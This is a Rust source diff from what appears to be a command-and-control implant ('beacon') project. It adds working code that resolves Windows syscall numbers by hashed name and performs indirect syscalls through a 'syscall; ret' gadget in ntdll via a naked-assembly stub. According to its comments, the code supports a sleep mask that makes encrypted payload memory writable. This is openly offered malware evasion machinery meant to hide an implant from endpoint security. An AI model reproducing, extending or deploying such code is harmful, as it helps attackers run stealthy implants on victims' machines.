@@ -11,6 +11,7 @@
 //! beacon memory; it runs from a `0F 05 C3` gadget inside ntdll's own
 //! `.text`, re-randomized every sleep cycle by the caller.
 
+use core::arch::naked_asm;
 use core::ffi::c_void;
 
 use specter_core::peb;
@@ -35,6 +36,110 @@ pub struct Syscalls {
 const DELAY_EXECUTION: (u64, u64) = syscalls::hash_nt_or_zw("NtDelayExecution");
 const GET_CONTEXT_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtGetContextThread");
 const SET_CONTEXT_THREAD: (u64, u64) = syscalls::hash_nt_or_zw("NtSetContextThread");
+const PROTECT_VIRTMEM: (u64, u64) = syscalls::hash_nt_or_zw("NtProtectVirtualMemory");
+
+/// SSN of `NtProtectVirtualMemory` — the sleep mask flips its image
+/// ranges writable for the encrypted window (RX-mapped payloads).
+///
+/// # Safety
+///
+/// `ntdll` must be a valid mapped ntdll image.
+pub unsafe fn protect_virtmem_ssn(ntdll: *mut c_void) -> Option<u32> {
+    let mut zw = ZwStubs::new();
+    syscalls::collect_zw_stubs(ntdll, &mut zw);
+    ssn_of(ntdll, &zw, PROTECT_VIRTMEM)
+}
+
+/// Execute an indirect syscall with 5 arguments (Microsoft x64 ABI:
+/// RCX, RDX, R8, R9, [rsp+0x20] — the stub moves RCX to R10 and the
+/// gadget's `call` pushes the return address, so the fifth argument is
+/// read at [rsp+0x20] of the caller frame). Used by the sleep-mask probe
+/// (`NtProtectVirtualMemory`).
+///
+/// # Safety
+///
+/// `ssn` must be a valid syscall number and `gadget` a `syscall; ret`
+/// address inside ntdll; `arg5` must be a valid pointer-sized value.
+/// Argument block for the 5-argument indirect syscall stub (the naked asm
+/// loads every field by fixed offset; pinned by the naked fn contract).
+#[repr(C)]
+pub struct Syscall5 {
+    pub rcx: usize,    // +0x00
+    pub rdx: usize,    // +0x08
+    pub r8: usize,     // +0x10
+    pub r9: usize,     // +0x18
+    pub arg5: usize,   // +0x20 (written to the fifth-argument stack slot)
+    pub ssn: u32,      // +0x28
+    pub gadget: usize, // +0x30
+}
+
+/// Five-argument indirect syscall stub. A naked fn rather than inline
+/// asm: the fifth argument lives at the caller-frame [rsp+0x20] slot at
+/// the moment of the call, and inline asm cannot own that slot — writing
+/// it from `asm!` would clobber compiler-managed spill space. Here the
+/// frame layout is explicit and deterministic.
+///
+/// # Safety
+///
+/// `block` must be fully initialized: a valid syscall number and a
+/// `syscall; ret` gadget address inside ntdll.
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "C" fn spt_syscall5(block: usize) -> usize {
+    naked_asm!(
+        "push rbx",
+        "push rbp",
+        "push rdi",
+        "push r14",
+        "sub  rsp, 0x38",
+        "mov  r14, rcx", // block (callee-saved across the call)
+        "mov  rcx, [r14 + 0x00]",
+        "mov  rdx, [r14 + 0x08]",
+        "mov  r8,  [r14 + 0x10]",
+        "mov  r9,  [r14 + 0x18]",
+        "mov  rax, [r14 + 0x20]",
+        "mov  [rsp + 0x20], rax", // fifth argument slot (own frame)
+        "mov  eax, [r14 + 0x28]", // SSN
+        "mov  r10, rcx",          // syscall ABI: arg1 -> r10
+        "mov  r11, [r14 + 0x30]", // gadget
+        "call r11",
+        "add  rsp, 0x38",
+        "pop  r14",
+        "pop  rdi",
+        "pop  rbp",
+        "pop  rbx",
+        "ret",
+    );
+}
+
+/// Execute an indirect syscall with 5 arguments through the naked stub.
+/// The status (NTSTATUS) is returned.
+///
+/// # Safety
+///
+/// `ssn` must be a valid syscall number and `gadget` a `syscall; ret`
+/// address inside ntdll; pointer arguments must be valid for the syscall.
+#[inline(always)]
+pub unsafe fn indirect_syscall5(
+    ssn: u32,
+    gadget: *const c_void,
+    rcx: usize,
+    rdx: usize,
+    r8: usize,
+    r9: usize,
+    arg5: usize,
+) -> i32 {
+    let block = Syscall5 {
+        rcx,
+        rdx,
+        r8,
+        r9,
+        arg5,
+        ssn,
+        gadget: gadget as usize,
+    };
+    spt_syscall5(core::ptr::from_ref(&block) as usize) as i32
+}
 
 /// Resolve the SSN of an Nt* function through either of its two export
 /// names (Nt*/Zw* point at the same stub), Hell's Gate with Tartarus'
